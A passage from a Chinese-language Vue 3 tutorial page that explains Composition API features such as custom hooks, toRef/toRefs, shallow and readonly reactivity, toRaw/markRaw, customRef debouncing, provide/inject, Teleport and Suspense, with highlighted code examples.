function_">reactive</span>(&#123;</span><br><span class="line"><span class="attr">x</span>:<span class="number">0</span>,</span><br><span class="line"><span class="attr">y</span>:<span class="number">0</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现鼠标“打点”相关的方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">savePoint</span>(<span class="params">event</span>)&#123;</span><br><span class="line">point.<span class="property">x</span> = event.<span class="property">pageX</span></span><br><span class="line">point.<span class="property">y</span> = event.<span class="property">pageY</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">pageX</span>,event.<span class="property">pageY</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现鼠标“打点”相关的生命周期钩子</span></span><br><span class="line"><span class="title function_">onMounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>,savePoint)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">onBeforeUnmount</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>,savePoint)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> point</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--使用hook函数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是Test组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前点击时鼠标的坐标为：x：&#123;&#123;point.x&#125;&#125;，y：&#123;&#123;point.y&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">import</span> usePoint <span class="keyword">from</span> <span class="string">&#x27;../hooks/usePoint&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>:<span class="string">&#x27;Test&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> point = <span class="title function_">usePoint</span>()</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;point&#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="toRef"><a href="#toRef" class="headerlink" title="toRef"></a>toRef</h2><ul><li>作用：创建一个 ref （ObjectRefImpl）对象，其value值指向另一个对象(toRef操作的对象)中的某个属性。</li><li>语法：<code>const name = toRef(person,&#39;name&#39;)</code><ul><li>person：操作哪个对象</li><li>name：操作对象中的哪个属性</li></ul></li><li>应用:   要将响应式对象中的某个属性单独提供给外部使用时，不想丢失响应式，需要使用toRef/toRefs<br><img src="/images/toRef.png" alt="img.png"></li><li>扩展：<code>toRefs</code> 与<code>toRef</code>功能一致，但可以批量创建多个 ref 对象，语法：<code>toRefs(person)</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reactive, toRef, toRefs&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;DEMO&#x27;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 数据</span></span><br><span class="line">    <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">      <span class="attr">job</span>: &#123;</span><br><span class="line">        <span class="attr">j1</span>:&#123;</span><br><span class="line">          <span class="attr">salary</span>: <span class="number">20</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> x = <span class="title function_">toRefs</span>(person)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个对象（常用）</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="comment">// name: toRef(person, &#x27;name&#x27;),</span></span><br><span class="line">      <span class="comment">// age: toRef(person, &#x27;age&#x27;),</span></span><br><span class="line">      <span class="comment">// salary: toRef(person.job.j1, &#x27;salary&#x27;),</span></span><br><span class="line">      ...<span class="title function_">toRefs</span>(person)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/toRef%E5%92%8CtoRefs.png" alt="img.png"></p><hr><h1 id="其它-Composition-API"><a href="#其它-Composition-API" class="headerlink" title="其它 Composition API"></a>其它 Composition API</h1><h2 id="shallowReactive-与-shallowRef"><a href="#shallowReactive-与-shallowRef" class="headerlink" title="shallowReactive 与 shallowRef"></a>shallowReactive 与 shallowRef</h2><ul><li><p>shallowReactive：只处理对象最外层属性的响应式（浅响应式）。</p></li><li><p>reactive与shallowReactive的区别：</p><ul><li>shallowReactive只考虑对象类型的第一层数据的响应式，深层的不考虑</li></ul></li><li><p>shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。</p></li><li><p>ref与shallowRef的区别：</p><ul><li>shallowRef不可以处理对象类型数据的响应式，而ref可以处理基础数据类型和对象类型数据（底层求助了reactive变成一个proxy的代理对象）的响应式</li></ul></li><li><p>什么时候使用?</p><ul><li> 如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===&gt; shallowReactive。</li><li> 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象（即给shallowRef定义对象重新赋值）来替换 ===&gt; shallowRef。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;shallowReactive, shallowRef, toRefs&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;DEMO&#x27;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 数据</span></span><br><span class="line">    <span class="keyword">let</span> person = <span class="title function_">shallowReactive</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">      <span class="attr">job</span>: &#123;</span><br><span class="line">        <span class="attr">j1</span>:&#123;</span><br><span class="line">          <span class="attr">salary</span>: <span class="number">20</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> x = <span class="title function_">shallowRef</span>(<span class="number">0</span>) <span class="comment">// 数据响应式不影响</span></span><br><span class="line">    <span class="keyword">let</span> y = <span class="title function_">shallowRef</span>(&#123;</span><br><span class="line">      <span class="attr">z</span>:<span class="number">0</span></span><br><span class="line">    &#125;) <span class="comment">// 对象类型数据不考虑做响应式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个对象（常用）</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      x,</span><br><span class="line">      y,</span><br><span class="line">      ...<span class="title function_">toRefs</span>(person)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/shallowRef%E5%92%8CshallowReactive.png" alt="img.png"></p><h2 id="readonly-与-shallowReadonly"><a href="#readonly-与-shallowReadonly" class="headerlink" title="readonly 与 shallowReadonly"></a>readonly 与 shallowReadonly</h2><ul><li>readonly: 让一个响应式数据变为只读的（深只读）。</li><li>shallowReadonly：让一个响应式数据变为只读的（浅只读）。</li><li>应用场景: 接收别人的数据，不希望数据被修改时。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reactive, ref, toRefs, readonly, shallowReadonly&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;DEMO&#x27;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 数据</span></span><br><span class="line">    <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">      <span class="attr">job</span>: &#123;</span><br><span class="line">        <span class="attr">j1</span>:&#123;</span><br><span class="line">          <span class="attr">salary</span>: <span class="number">20</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// person = readonly(person)</span></span><br><span class="line">    <span class="comment">// person = shallowReadonly(person)</span></span><br><span class="line">    <span class="comment">// sum = readonly(sum)</span></span><br><span class="line">    <span class="comment">// sum = shallowReadonly(sum)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个对象（常用）</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      sum,</span><br><span class="line">      ...<span class="title function_">toRefs</span>(person)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="toRaw-与-markRaw"><a href="#toRaw-与-markRaw" class="headerlink" title="toRaw 与 markRaw"></a>toRaw 与 markRaw</h2><ul><li>toRaw(raw译原始)：<ul><li>作用：将一个由<code>reactive</code>生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。</li><li>使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。</li></ul></li><li>markRaw：<ul><li>作用：标记一个对象，使其永远不会再成为响应式对象。</li><li>应用场景:<ol><li>有些值不应被设置为响应式的，例如复杂的第三方类库等。</li><li>当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。</li></ol></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;reactive, ref, toRefs, toRaw, markRaw&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;DEMO&#x27;</span>,</span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 数据</span></span><br><span class="line">    <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">      <span class="attr">job</span>: &#123;</span><br><span class="line">        <span class="attr">j1</span>:&#123;</span><br><span class="line">          <span class="attr">salary</span>: <span class="number">20</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showRawPerson</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">const</span> p = <span class="title function_">toRaw</span>(person)</span><br><span class="line">      p.<span class="property">age</span>++</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(p)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addCar</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> car = &#123; <span class="attr">name</span>: <span class="string">&#x27;奔驰&#x27;</span>, <span class="attr">price</span>: <span class="number">40</span> &#125;</span><br><span class="line">      <span class="comment">//person.car = car // car自动变成响应式（因为proxy代理，可以捕获对象的操作），但是初始状态person没有car，页面使用时注意</span></span><br><span class="line">      person.<span class="property">car</span> = <span class="title function_">markRaw</span>(car) <span class="comment">// car被当最原始的数据使用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">changePrice</span>(<span class="params"></span>)&#123;</span><br><span class="line">      person.<span class="property">car</span>.<span class="property">price</span>++</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">car</span>.<span class="property">price</span>) <span class="comment">// 经过markRaw()处理后，修改车价格，价格发生变化，只是数据不是响应式的，页面无法展示新价格</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个对象（常用）</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      sum,</span><br><span class="line">      person,</span><br><span class="line">      ...<span class="title function_">toRefs</span>(person),</span><br><span class="line">      showRawPerson,</span><br><span class="line">      addCar,</span><br><span class="line">      changePrice</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="customRef"><a href="#customRef" class="headerlink" title="customRef"></a>customRef</h2><ul><li><p>customRef(custom译自定义)作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。</p></li><li><p>实现防抖效果：</p></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyword&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123;keyword&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">import</span> &#123;ref,customRef&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>:<span class="string">&#x27;Demo&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">setup</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//自定义一个ref——名为：myRef</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">myRef</span>(<span class="params">value,delay</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">let</span> timer</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">//通过customRef去实现自定义，return出子定义ref</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="title function_">customRef</span>(<span class="function">(<span class="params">track,trigger</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span>&#123; <span class="comment">// return对象，语法要求</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">get</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`有人从myRef这个容器中读取数据了，我把<span class="subst">$&#123;value&#125;</span>给他了`</span>)</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">track</span>() <span class="comment">//通知Vue“追踪”数据（value）的变化(提前与get商量一下，让他认为value是有用的)</span></span></span><br><span class="line"><span class="language-javascript">                            <span class="keyword">return</span> value <span class="comment">// 步骤3</span></span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">set</span>(<span class="params">newValue</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`有人把myRef这个容器中数据改为了：<span class="subst">$&#123;newValue&#125;</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">                            <span class="built_in">clearTimeout</span>(timer) <span class="comment">// 防抖，一直快速输入时等到停止输入后，delay时后h3标签中展示输入信息</span></span></span><br><span class="line"><span class="language-javascript">                            timer = <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                                value = newValue <span class="comment">// 需要更新value，因为get中使用value，步骤1</span></span></span><br><span class="line"><span class="language-javascript">                                <span class="title function_">trigger</span>() <span class="comment">//通知Vue重新解析模板（更新界面），步骤2</span></span></span><br><span class="line"><span class="language-javascript">                            &#125;,delay)</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// let keyword = ref(&#x27;hello&#x27;) //使用Vue提供的内置ref</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> keyword = <span class="title function_">myRef</span>(<span class="string">&#x27;hello&#x27;</span>,<span class="number">500</span>) <span class="comment">//使用程序员自定义的ref</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                keyword</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="provide-与-inject"><a href="#provide-与-inject" class="headerlink" title="provide 与 inject"></a>provide 与 inject</h2><p><img src="/images/provide.png" alt="img.png"></p><ul><li><p>作用：实现<strong style="color:#DD5145">祖与后代组件间(跨级组件)</strong>通信</p></li><li><p>套路：父组件有一个 <code>provide</code> 选项来提供数据，后代组件有一个 <code>inject</code> 选项来开始使用这些数据</p></li><li><p>语法：</p><ul><li>provide(‘传递的名称’, 要传递的内容)</li><li>let name = inject(‘传递的名称’)</li></ul></li><li><p>具体写法：</p><ul><li><p>祖组件中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">let</span> car = <span class="title function_">reactive</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;奔驰&#x27;</span>,<span class="attr">price</span>:<span class="string">&#x27;40万&#x27;</span>&#125;)</span><br><span class="line">    <span class="title function_">provide</span>(<span class="string">&#x27;car&#x27;</span>,car)</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>后代组件中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params">props,context</span>)&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">const</span> car = <span class="title function_">inject</span>(<span class="string">&#x27;car&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;car&#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="响应式数据的判断"><a href="#响应式数据的判断" class="headerlink" title="响应式数据的判断"></a>响应式数据的判断</h2><ul><li>isRef: 检查一个值是否为一个<code>ref</code>对象</li><li>isReactive: 检查一个对象是否是由 <code>reactive</code> 创建的响应式代理</li><li>isReadonly: 检查一个对象是否是由 <code>readonly</code> 创建的只读代理</li><li>isProxy: 检查一个对象是否是由 <code>reactive</code> 或者 <code>readonly(作用的响应式都对象)</code> 方法创建的代理<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">setup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">let</span> car = <span class="title function_">reactive</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;奔驰&#x27;</span>,<span class="attr">price</span>:<span class="string">&#x27;40万&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">let</span> car2 = <span class="title function_">readonly</span>(car)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isRef</span>(sum)) <span class="comment">// true</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(car)) <span class="comment">// true</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReadonly</span>(car2)) <span class="comment">// true</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isProxy</span>(car)) <span class="comment">// true</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isProxy</span>(sum)) <span class="comment">// false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="Composition-API-的优势"><a href="#Composition-API-的优势" class="headerlink" title="Composition API 的优势"></a>Composition API 的优势</h1><h2 id="Options-API-配置式-存在的问题"><a href="#Options-API-配置式-存在的问题" class="headerlink" title="Options API(配置式) 存在的问题"></a>Options API(配置式) 存在的问题</h2><p>使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。</p><iframesrc="/images/OptionsAPI01.mp4"scrolling="no"border="0"frameborder="no"framespacing="0"allowfullscreen="true"height=600width=800></iframe><iframesrc="/images/OptionsAPI02.mp4"scrolling="no"border="0"frameborder="no"framespacing="0"allowfullscreen="true"height=600width=800></iframe>## Composition API（组合式） 的优势<p>我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起–借助hook函数。</p><iframesrc="/images/OptionsAPI03.mp4"scrolling="no"border="0"frameborder="no"framespacing="0"allowfullscreen="true"height=600width=800></iframe><iframesrc="/images/OptionsAPI04.mp4"scrolling="no"border="0"frameborder="no"framespacing="0"allowfullscreen="true"height=600width=800></iframe><hr><h1 id="新的组件"><a href="#新的组件" class="headerlink" title="新的组件"></a>新的组件</h1><h2 id="Fragment"><a href="#Fragment" class="headerlink" title="Fragment"></a>Fragment</h2><ul><li>在Vue2中: 组件必须有一个根标签</li><li>在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中</li><li>好处: 减少标签层级, 减小内存占用</li></ul><h2 id="Teleport"><a href="#Teleport" class="headerlink" title="Teleport"></a>Teleport</h2><ul><li>什么是Teleport？—— <code>Teleport</code> 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。</li><li>to移动位置值：<ul><li>html、body标签</li><li>css选择器(#id,.class)<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">teleport</span> <span class="attr">to</span>=<span class="string">&quot;移动位置&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;isShow&quot;</span> <span class="attr">class</span>=<span class="string">&quot;mask&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;dialog&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>我是一个弹窗<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isShow = false&quot;</span>&gt;</span>关闭弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">teleport</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="Suspense"><a href="#Suspense" class="headerlink" title="Suspense"></a>Suspense</h2><ul><li><p>等待异步组件时渲染一些额外内容，让应用有更好的用户体验</p></li><li><p>Suspense底层使用插槽实现的</p><ul><li>v-slot:default：默认展示，真正需要展示内容</li><li>v-slot:fallback：加载慢展示内容</li></ul></li><li><p>使用场景</p><ul><li>网速慢</li><li>使用promise</li></ul></li><li><p>使用步骤：</p><ul><li><p>异步引入组件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父组件中引入子组件</span></span><br><span class="line"><span class="comment">// import Child from &#x27;./components/Child.vue&#x27; // 静态引入(父组件和子组件内容一起渲染出来)</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineAsyncComponent&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Child</span> = <span class="title function_">defineAsyncComponent</span>(<span class="function">()=&gt;</span><span class="keyword">import</span>(<span class="string">&#x27;./components/Child.vue&#x27;</span>)) <span class="comment">// 动态引入（异步引入）（父组件先渲染出来，然后时子组件渲染出来）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子组件</span></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">setup</span>(<span class="params"></span>)&#123; <span class="comment">// 引入child使用异步引入，setup中可以使用async，await，promise</span></span><br><span class="line">   <span class="keyword">let</span> sum = <span class="title function_">ref</span>(<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(&#123;sum&#125;)</span><br><span class="line">      &#125;, <span class="number">3000</span>)        </span><br><span class="line">   &#125;)</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">await</span> p</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用<code>Suspense</code>包裹组件，并配置好<code>default</code> 与 <code>fallback</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>我是App组件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Suspense</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:default</span>&gt;</span></span><br><span class="line">                 <span class="comment">&lt;!-- 默认展示：真正展示内容 default固定 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Child</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:fallback</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 加载慢展示内容 fallback固定--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span>&gt;</span>加载中.....<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Suspense</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="全局API的转移"><a href="#全局API的转移" class="headerlink" title="全局API的转移"></a>全局API的转移</h2><ul><li><p>Vue 2.x 有许多全局 API 和配置。</p><ul><li>例如：注册全局组件、注册全局指令等。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注册全局组件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;MyButton&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;&lt;button @click=&quot;count++&quot;&gt;Clicked 